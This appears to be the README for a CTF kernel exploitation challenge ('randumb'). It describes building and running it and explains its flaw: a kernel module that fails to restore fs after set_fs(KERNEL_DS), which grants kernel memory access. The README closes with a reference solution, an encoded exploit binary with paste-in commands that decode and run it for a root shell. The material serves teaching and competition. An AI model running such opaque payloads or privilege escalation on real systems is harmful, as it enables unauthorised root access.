# randumb by b0bb

An extremely simple kernel pwn challenge that uses a vector that is often overlooked in these sorts of challenges, a logic flaw. Might be a nice warmup if there are some other kernel challenges. It can be run on any architecture, there are some differences in how to end the exploit (depending on which architecture is chosen), but the main idea is the same. I prefer MIPS since it is more interesting to code the exploit, but it doesn't make too much difference.

The nature of the bug is fairly simple and source code can even be provided to make the task easier. Depending on their ability, the bug might be somewhat subtle to spot.

### Building

The kernel, busybox and the kernel module are already built. However to rebuild, just `cd build` and do `./build`. This quick and dirty build script will download the kernel and busybox sources and compile everything into a final package. The kernel selected is a version 3 kernel, however everything can be built for a version 4 kernel (up to version 4.9.93 ) without change. This will make the challenge a little more difficult as the user will have to decompress the kernel or use the stack leak.

Once the kernel and file system are built, the release files (the ones that will run on the remote server) will be put in the `docker` folder as well as `challenge/release.tar.gz`. The `challenge/distribute.tar.gz` file is the one that can be distributed to players so that they can debug on their own machine. The only differences between the two releases is that the flag is not present (for obvious reasons) and there is no timeout.

When building the kernel and busybox, you will be presented with a config selection screen twice (once for each project). The only mandatory option is for busybox (to build as a static library), however this is how everything is built now:

**kernel**
```bash
    # -> Networking support=n
    # -> Device Drivers
    #    -> Serial ATA and Parallel ATA drivers (libata)=n
    #    -> Hardware Monitoring support=n
    #    -> Voltage and Current Regulator Support=n
    #    -> Sound card support=n
    #    -> USB support=n
    #    -> MMC/SD/SDIO card support=n
    #    -> LED Support=n
    #    -> IOMMU Hardware Support=n
```

**busybox**
```bash
    # -> Settings
    #    -> Build Options
    #       -> Build static binary=y
    # -> Shells
    #    -> Use HISTFILESIZE=n
```

### Running

To run the docker container just do `docker-compose up` from the `docker` folder. This will start a service on port `13579` that will spin up a small qemu instance.

### Connecting

Once the docker container is running, you can connect to `localhost:13579`:
```bash
$ nc localhost 13579
GIC CPU mask not found - kernel will fail to boot.
GIC CPU mask not found - kernel will fail to boot.
/cpus/cpu@0 missing clock-frequency property

                                  Midnight Sun CTF presents...

██████╗  █████╗ ███╗   ██╗██████╗ ██╗   ██╗███╗   ███╗██████╗ 
██╔══██╗██╔══██╗████╗  ██║██╔══██╗██║   ██║████╗ ████║██╔══██╗
██████╔╝███████║██╔██╗ ██║██║  ██║██║   ██║██╔████╔██║██████╔╝
██╔══██╗██╔══██║██║╚██╗██║██║  ██║██║   ██║██║╚██╔╝██║██╔══██╗
██║  ██║██║  ██║██║ ╚████║██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ 
/ $ ls -al
ls -al
total 124
drwxrwxr-x   13 root     root             0 Apr  9 15:37 .
drwxrwxr-x   13 root     root             0 Apr  9 15:37 ..
drwxrwxr-x    2 root     root             0 Apr  9 15:36 bin
drwxr-xr-x    3 root     root          2520 Apr  9 16:17 dev
drwxrwxr-x    3 root     root             0 Apr  9 15:37 etc
drwxrwxr-x    3 root     root             0 Apr  9 15:37 home
lrwxrwxrwx    1 randumb  randumb         11 Apr  9 15:36 linuxrc -> bin/busybox
dr-xr-xr-x   37 root     root             0 Jan  1  1970 proc
-rw-rw-r--    1 root     root        124316 Apr  9 15:37 randumb.ko
drwx------    2 root     root             0 Apr  9 15:37 root
drwxrwxr-x    2 root     root             0 Apr  9 15:36 sbin
drwxrwxr-x    2 root     root             0 Apr  9 15:37 src
dr-xr-xr-x   12 root     root             0 Apr  9 16:17 sys
drwxrwxrwt    2 root     root            40 Apr  9 16:17 tmp
drwxrwxr-x    4 root     root             0 Apr  9 15:37 usr
/ $ exit
exit

Game Over.
reboot: Power down

```

### Flaw

**Spoiler Alert:** I am about to explain the flaw.

The main flaw can be seen in the following lines:
```c
        old_fs = get_fs();
        set_fs(KERNEL_DS);

        file = filp_open(DEBUG_FILE, O_WRONLY|O_CREAT|O_APPEND, 0644);

        if (IS_ERR(file))
                return -EINVAL;
```

As you can see, if the `file` cannot be opened, the function returns. The only problem with this is that `fs` was not restored before returning. This means the process will now be able to access kernel memory regions in the future for reading and writing.

There is also a convenient memory leak with the `ioctl` function.

### Exploit

In order to exploit this bug, one would just make sure the file could not be opened, so that the `filp_open` call will fail (using too many file descriptors, or making a directory with that name). After that the attacker can simply create pipes to `read()` and `write()` from/to kernel memory, probably using that friendly memory leak to assist them (but not absolutely required).

A reference solution is provided in the `solution` folder. To make a payload enter that directory and run `./build.sh`, you will get a payload similar to the following:
```bash
$ ./build.sh

Paste the following into the VM:
---------- BEGIN COPY ----------
cd /tmp
echo 'QlpoOTFBWSZTWTlbbeMAA8d//////v39///8+/9/ev/v3+PsSgx2wHQlF37QacL+/KWV0ASeUPXWunA2wODEVPU2qeCmRoyAM0gGgZDQNMgAAAAAGgAAAAAAeoAPUNGgAAAamRpTE2gjTRNU/JqjbKjyeqbQJgmamTJppoaMRmkfqAIxMAE0YagzQAQ09CYJpkBkyNCAA0xNGmRhNA0yYJpoaGTBDQaMQYAhoyGTIwQAMgaZMhoYgNGmENANAaZQgijTQAND1AAAaBkDQAAAMg0Bo0AAG0gDQAAAAHpHpPSACRRMkTVN6p+mhTBqYyQeU8kaeoehDJo9RkYmAhkMGo0AZpDR6j0jbUQAZNBkaYJiaPUA/U186aFJpDAc5wERdI2+538Cjb936f5anuLmpnq9w81Y3U62n8LFxpF2kJmbzle/o180gs6O/ubvQcOlYlFxHCYKNSB91i4iAgO/M5ivciUNtQwkEjipQe6YgbbdMaVRELBNCiHAZy1ckHrpkZ55bOGZ5Nrj/LTmvh/VIxa+gBAWGkDZeMg0lUwoIyGZyUBW+rAw2VWSH03mToiqjpaiwcoJHk67TebhUbrTb9+fde/WSWS8DBsaeFnBmjQ+XUmMdCBd05MqteAlsRtNRiAmy9GSeokl4ZEJsvWoPHewYlVYV3AbkwgCIgNMys6dHAQI5vMlEr4LpQHOREMVTWSTpDZU1C1D7jEk7B/B6sVYcrMIQhFqI8XHudLdWXlXlTsXanWdO3k6srVSRO08tq2YUIR9si3x/S2XcktoaDZsD8BfFkdrh/jedQIoRCR2GMY2N5blQqIsYOEE2sPDgJBIZJqkCYyGI3vJKeHsnHhu3MHs0EQgQmSQQLEKjSlc8Ktfxnle5MM6xBrLr2OBkd7PM2NSIWQG/xgui4iHeNImMgQCD6fg8bYnGdmD4aiD3YlGjWlEklgBoJQZK05joqOsz9VMuWmVY8zpUHM4HRp77N55Jl26yTTDiMLx'>>ex.b64
echo '9XqQ0u2cAMvOwvWr1oq64gUjL6jC2kynLphOAm0N6r+sSKRKrBaJlbArT2zQYJK4HIPQTn8gKVRWYetEwKRhiiFAQmmI1pBGZcpl6KfXv/bLC6Q7BAyUGk8XLXZ+d0cAgejSUkhCC9ElOzQPyKFQgo0eGPFD0c1i/BXyFJqxKKWfdSK+VeuLeZoSWoUyFA5Vzmal/DJRdervcwPif5V66QC1hBe0HS6QOC32ayxe2Z88lCk08YvyO+WEClEPUKQT9M5Rfpi63L4dxaWz7+JjoMzRMdrA7pVsGvNhYD4xaof+++gGBRCW052HBZ/iO6/FxutvKQpwnkQZnUfHcAaCslcWJrRyOjSteaVqGhhNajRJxSaFwWNqhBgaNkAgXiBYJWJE5quiSl2z+FyCAFPSe6sbxHIIrHoiR97xWRMCQtbIowzGxpqssHJWpGX1dUcPExlp7UWMw3hfSxMfplJE2oSxA+ui6D82UBO726hzxFySXSOq/VeCKNIck9D9QgjCEkdJYqTNf1hJWdZruJmYRtNtSIU20jm0U0GeIXp554xYuzB5wKQQiDDzZ98nAlX4mjWyETMSND9BSwYismyN4rTRKIYEDKwJU+e93SbDo+/z+HsdPFFdFeOsPPtFZqNsJYsIgYCfXbZgqd50VH0leiHbJgtWn3LkmYREZSqMOiVoUamBRnlFJ0AfhcGEgqlTmBKSCrOM6xQ/VzFajy2/Ewxp1HYEzOOOOShCsT3RMjAhIotIbYs4ExFM2nTp8ahJXoOMd0ZhJEHlIqdk3s0ZAdlp+jbzQ8dWq6Wa4bAyTdTXvaLSGnp44NVkaY1hEJqEC1QRa66fc32wGPBLUCvsUSQWBYnX0fqYqJK35EpUqkZhgiziwlcohSP5+gH3j+Ex68KDgKRKeXGkQjM7k0ZIs1DqtswN1h4AkAliSWbEGjv8D+ygj5E/9J0xVo4LQZDIpW7fPcLf/29FfWeuLuSKcKEgcrbbxg=='>>ex.b64
cat ex.b64 | base64 -d | bzip2 -d > ./ex; chmod +x ./ex; ./ex
----------- END COPY -----------
```

Paste that into the VM and you will be presented with a root shell. The flag is in `/root/flag`.
